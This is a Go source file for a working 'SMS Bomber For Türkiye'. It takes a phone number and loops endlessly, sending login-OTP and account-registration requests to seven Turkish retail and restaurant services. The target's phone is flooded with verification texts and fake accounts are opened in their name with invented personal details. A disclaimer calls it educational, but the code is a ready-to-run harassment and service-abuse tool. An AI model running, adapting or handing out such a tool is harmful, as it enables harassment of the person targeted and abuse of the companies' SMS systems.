// Bu yazılım yalnızca eğitim amaçlı kullanım içindir.
// Geliştirici (m3tozz), yazılımın kötüye kullanımı, yasa dışı faaliyetleri veya kullanımından kaynaklanan istenmeyen sonuçlardan sorumlu değildir.
// Lütfen etik ve sorumlu bir şekilde kullanın.

package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

type Bot struct {
	Phone string
	Adet  int
}

func (b *Bot) baslat() {
	for {
		fmt.Println("\nYeni döngü başladı..")
		fmt.Println("\niptal etmek için ctrl+c ye bas..")
		b.Espressolab()
		b.KahveDunyasi()
		b.OhannesBurger()
		b.wmf()
		b.saloon()
		b.sokmarket()
		b.bim()
		time.Sleep(1 * time.Second)

	}
}
func (b *Bot) bim() {
	client := &http.Client{Timeout: 10 * time.Second}
	urlRegister := "https://bim.veesk.net:443/service/v1.0/account/login"
	phone := b.Phone

	payloadRegister := map[string]any{
		"phone": phone,
	}

	jsonDataReg, _ := json.Marshal(payloadRegister)
	reqReg, err := http.NewRequest("POST", urlRegister, bytes.NewBuffer(jsonDataReg))
	if err != nil {
		fmt.Println("bim Register Request hatası")
		return
	}

	reqReg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	reqReg.Header.Set("Content-Type", "application/json")
	reqReg.Header.Set("Accept", "application/json, text/plain, */*")
	reqReg.Header.Set("Origin", "https://www.bim.com.tr/")
	reqReg.Header.Set("Referer", "https://www.bim.com.tr/")

	respReg, err := client.Do(reqReg)
	if err != nil {
		fmt.Println("[-] bim Bağlantı Hatası:", err)
		return
	}
	defer respReg.Body.Close()

	if respReg.StatusCode >= 200 && respReg.StatusCode < 4000 {
		fmt.Println("[+] bim Başarılı!", b.Phone)
		b.Adet++
	} else {
		body, _ := io.ReadAll(respReg.Body)
		fmt.Printf("[-] bim Başarısız! (Status Code: %d)\n", respReg.StatusCode)
		if len(body) > 0 {
			fmt.Println("Sunucu Yanıtı:", string(body))
		}
	}

	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
}
func (b *Bot) sokmarket() {
	client := &http.Client{Timeout: 10 * time.Second}
	urlRegister := "https://giris.ec.sokmarket.com.tr/api/authentication/otp/generate"
	phone := b.Phone

	payloadRegister := map[string]any{
		"captchaAction": "generate_login_otp",
		"captchaToken":  "",
		"clientId":      "buyer-web",
		"phoneNumber":   phone,
		"reCaptchaV2":   false,
	}

	jsonDataReg, _ := json.Marshal(payloadRegister)
	reqReg, err := http.NewRequest("POST", urlRegister, bytes.NewBuffer(jsonDataReg))
	if err != nil {
		fmt.Println("sokmarket Register Request hatası")
		return
	}

	reqReg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	reqReg.Header.Set("Content-Type", "application/json")
	reqReg.Header.Set("Accept", "application/json, text/plain, */*")
	reqReg.Header.Set("Origin", "https://giris.ec.sokmarket.com.tr/otp-login")
	reqReg.Header.Set("Referer", "https://giris.ec.sokmarket.com.tr/otp-login")

	respReg, err := client.Do(reqReg)
	if err != nil {
		fmt.Println("[-] sokmarket Bağlantı Hatası:", err)
		return
	}
	defer respReg.Body.Close()

	if respReg.StatusCode >= 200 && respReg.StatusCode < 4000 {
		fmt.Println("[+] sokmarket Başarılı!", b.Phone)
		b.Adet++
	} else {
		body, _ := io.ReadAll(respReg.Body)
		fmt.Printf("[-] sokmarket Başarısız! (Status Code: %d)\n", respReg.StatusCode)
		if len(body) > 0 {
			fmt.Println("Sunucu Yanıtı:", string(body))
		}
	}

	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
}
func (b *Bot) Espressolab() {
	url := "https://espressolab.com/api/register"

	payload := map[string]string{
		"phone": "90" + b.Phone,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Espressolab: JSON oluşturma hatası")
		return
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Espressolab: Request oluşturma hatası")
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Accept-Language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7")
	req.Header.Set("Origin", "https://espressolab.com")
	req.Header.Set("Referer", "https://espressolab.com/")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Espressolab Bağlantı hatası:", err)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		fmt.Printf("[-] Espressolab Hata Döndü (Status Code: %d)\n", resp.StatusCode)
		return
	}

	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		fmt.Println("[-] Espressolab: Yanıt JSON değil.")
		return
	}

	fmt.Println("[+] Espressolab Başarılı Yanıt Alındı:", b.Phone)
	b.Adet++
	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
}

func (b *Bot) KahveDunyasi() {
	url := "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"

	payload := map[string]string{
		"countryCode": "90",
		"phoneNumber": b.Phone,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Kahve Dünyası: JSON hata")
		return
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Kahve Dünyası: Request hata")
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Language-Id", "tr-TR")
	req.Header.Set("X-Client-Platform", "web")
	req.Header.Set("Origin", "https://www.kahvedunyasi.com")
	req.Header.Set("Referer", "https://www.kahvedunyasi.com/")

	client := &http.Client{
		Timeout: 6 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Kahve Dünyası Bağlantı Hatası:", b.Phone)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		fmt.Println("Kahve Dünyası: Cevap JSON değil")
		return
	}

	if result["processStatus"] == "Success" {
		fmt.Println("[+] Kahve Dünyası Başarılı!", b.Phone)
		b.Adet++
	} else {
		fmt.Println("[-] Kahve Dünyası Başarısız!", b.Phone)
	}
	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
}

func (b *Bot) OhannesBurger() {
	// hesap var mı
	urlControl := "https://service.ohannesburger.com/api/sales-web/customer_phone_control"

	formattedPhone := b.Phone
	if !strings.HasPrefix(formattedPhone, "0") {
		formattedPhone = "0" + formattedPhone
	}

	payloadControl := map[string]string{
		"phone": formattedPhone,
	}

	jsonData, err := json.Marshal(payloadControl)
	if err != nil {
		fmt.Println("Ohannes Burger: JSON hatası")
		return
	}

	req, err := http.NewRequest("POST", urlControl, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Ohannes Burger: Request hatası")
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Origin", "https://ohannesburger.com")
	req.Header.Set("Referer", "https://ohannesburger.com/")

	client := &http.Client{Timeout: 8 * time.Second}

	resp, err := client.Do(req)
	if err == nil && (resp.StatusCode == 200 || resp.StatusCode == 201) {
		resp.Body.Close()
		fmt.Println("[+] Ohannes Burger (Phone Control) Başarılı!", b.Phone)
		b.Adet++
		fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
		return
	}

	if resp != nil {
		resp.Body.Close()
	}

	// ohanes 2. senaryo
	urlRegister := "https://service.ohannesburger.com/api/sales-web/customer_register"

	payloadRegister := map[string]string{
		"email": "metincankurtaran@gmail.com",
		"name":  "Mete Bişgin",
		"phone": formattedPhone,
	}

	jsonDataReg, _ := json.Marshal(payloadRegister)
	reqReg, err := http.NewRequest("POST", urlRegister, bytes.NewBuffer(jsonDataReg))
	if err != nil {
		fmt.Println("Ohannes Burger: Register Request hatası")
		return
	}

	reqReg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	reqReg.Header.Set("Content-Type", "application/json")
	reqReg.Header.Set("Accept", "application/json, text/plain, */*")
	reqReg.Header.Set("Origin", "https://ohannesburger.com")
	reqReg.Header.Set("Referer", "https://ohannesburger.com/")

	respReg, err := client.Do(reqReg)
	if err != nil {
		fmt.Println("[-] Ohannes Burger Bağlantı Hatası:", err)
		return
	}
	defer respReg.Body.Close()

	if respReg.StatusCode == 200 || respReg.StatusCode == 201 {
		fmt.Println("[+] Ohannes Burger Başarılı!", b.Phone)
		b.Adet++
	} else {
		body, _ := io.ReadAll(respReg.Body)
		fmt.Printf("[-] Ohannes Burger Başarısız! (Status Code: %d)\n", respReg.StatusCode)
		if len(body) > 0 {
			fmt.Println("Sunucu Yanıtı:", string(body))
		}
	}
	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
}
func (b *Bot) wmf() {
	client := &http.Client{Timeout: 10 * time.Second}
	urlRegister := "https://www.wmf.com.tr/users/register/"
	formattedPhone := b.Phone
	if !strings.HasPrefix(formattedPhone, "0") {
		formattedPhone = "0" + formattedPhone
	}

	payloadRegister := map[string]string{
		"confirm":        "true",
		"date_of_birth":  "2002-11-12",
		"email":          "recepivedikmodesan@gmail.com",
		"first_name":     "Recep",
		"gender":         "male",
		"kvkk_agreement": "true",
		"last_name":      "İvedik",
		"password":       "BoHoHoYt.1",
		"phone":          formattedPhone,
	}

	jsonDataReg, _ := json.Marshal(payloadRegister)
	reqReg, err := http.NewRequest("POST", urlRegister, bytes.NewBuffer(jsonDataReg))
	if err != nil {
		fmt.Println("wmf Register Request hatası")
		return
	}

	reqReg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	reqReg.Header.Set("Content-Type", "application/json")
	reqReg.Header.Set("Accept", "application/json, text/plain, */*")
	reqReg.Header.Set("Origin", "https://www.wmf.com.tr")
	reqReg.Header.Set("Referer", "https://www.wmf.com.tr")

	respReg, err := client.Do(reqReg)
	if err != nil {
		fmt.Println("[-] wmf Bağlantı Hatası:", err)
		return
	}
	defer respReg.Body.Close()

	if respReg.StatusCode >= 200 && respReg.StatusCode < 4000 {
		fmt.Println("[+] wmf Başarılı!", b.Phone)
		b.Adet++
	} else {
		body, _ := io.ReadAll(respReg.Body)
		fmt.Printf("[-] wmf Başarısız! (Status Code: %d)\n", respReg.StatusCode)
		if len(body) > 0 {
			fmt.Println("Sunucu Yanıtı:", string(body))
		}
	}

	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
}
func (b *Bot) saloon() {
	client := &http.Client{Timeout: 10 * time.Second}
	urlRegister := "https://api.saloonburger.com.tr/api/Auth/LoginWithPhone"
	formattedPhone90 := b.Phone

	if strings.HasPrefix(formattedPhone90, "0") {
		formattedPhone90 = formattedPhone90[1:]
	}

	if !strings.HasPrefix(formattedPhone90, "+90") {
		formattedPhone90 = "+90" + formattedPhone90
	}

	payloadRegister := map[string]interface{}{
		"phoneNumber": formattedPhone90,
	}

	jsonDataReg, _ := json.Marshal(payloadRegister)
	reqReg, err := http.NewRequest("POST", urlRegister, bytes.NewBuffer(jsonDataReg))
	if err != nil {
		fmt.Println("wmf Register Request hatası")
		return
	}

	reqReg.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
	reqReg.Header.Set("Content-Type", "application/json")
	reqReg.Header.Set("Accept", "application/json, text/plain, */*")
	reqReg.Header.Set("Origin", "https://api.saloonburger.com.tr/api/Auth/Register")
	reqReg.Header.Set("Referer", "https://api.saloonburger.com.tr/api/Auth/Register")

	respReg, err := client.Do(reqReg)
	if err != nil {
		fmt.Println("[-] saloonburger Bağlantı Hatası:", err)
		return
	}
	defer respReg.Body.Close()

	if respReg.StatusCode >= 200 && respReg.StatusCode < 300 {
		fmt.Println("HTTP isteği başarılı")
	} else {
		body, _ := io.ReadAll(respReg.Body)
		fmt.Println("HTTP hatası:", respReg.StatusCode)
		fmt.Println("Sunucu yanıtı:", string(body))
	}

	fmt.Println("[+] saloonburger Başarılı Yanıt Alındı:", b.Phone)
	b.Adet++
	fmt.Println("Toplam Başarılı İstek Sayısı:", b.Adet)
}
func main() {
	fmt.Print("\033[1;31m")
	fmt.Println("UYARI VE SORUMLULUK REDDİ:")
	fmt.Println("Bu yazılım yalnızca eğitim, test ve güvenlik araştırmaları amacıyla geliştirilmiştir.")
	fmt.Println("Yazılımın yetkisiz veya yasa dışı sistemlerde kullanımı tamamen kullanıcının")
	fmt.Println("sorumluluğundadır. Geliştirici (m3tozz), doğabilecek doğrudan veya dolaylı")
	fmt.Println("zararlardan sorumlu tutulamaz.")
	fmt.Print("\033[0m")

	fmt.Println()

	fmt.Print("Aracı kullanmak ve şartları kabul ettiğinizi belirtmek için 'e' tuşunu girip enter tuşuna basınız  (Çıkış için herhangi bir tuşa basabilirsiniz): ")

	reader := bufio.NewReader(os.Stdin)
	input, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("\nGirdi okuma hatası oluştu.")
		return
	}

	input = strings.TrimSpace(strings.ToLower(input))

	if input != "e" {
		fmt.Println("\n[-] Kullanım şartları kabul edilmedi. Program kapatılıyor.")
		os.Exit(0)
	}
	isTermux := false
	for _, arg := range os.Args[1:] {
		if arg == "--termux" {
			isTermux = true
			break
		}
	}

	if isTermux {
		fmt.Print("\033[36m")
		fmt.Println(`
░▀█▀░█▀▀░█░░░█▀█░█▀▄░▀█▀
░░█░░█▀▀░█░░░█▀█░█▀▄░░█░
░░▀░░▀▀▀░▀▀▀░▀░▀░▀░▀░▀▀▀
  SMS Bomber For Türkiye
`)
		fmt.Print("\033[0m")

		var numara string

		fmt.Print("Numara gir (+90 olmadan): ")
		fmt.Scanln(&numara)
		bot := Bot{
			Phone: numara,
		}

		bot.baslat()
	} else {
		fmt.Print("\033[36m")
		fmt.Println(`
  ▄▄▄▄▄▄▄     ▄▄               
 █▀▀██▀▀▀▀     ██              
    ██         ██       ▄    ▀▀
    ██   ▄█▀█▄ ██ ▄▀▀█▄ ████▄██
    ██   ██▄█▀ ██ ▄█▀██ ██   ██
    ▀██▄▄▀█▄▄▄▄██▄▀█▄██▄█▀  ▄██
		SMS Bomber For Türkiye
`)
		fmt.Print("\033[0m")

		var numara string

		fmt.Print("Numara gir (+90 olmadan): ")
		fmt.Scanln(&numara)
		bot := Bot{
			Phone: numara,
		}

		bot.baslat()
	}

}
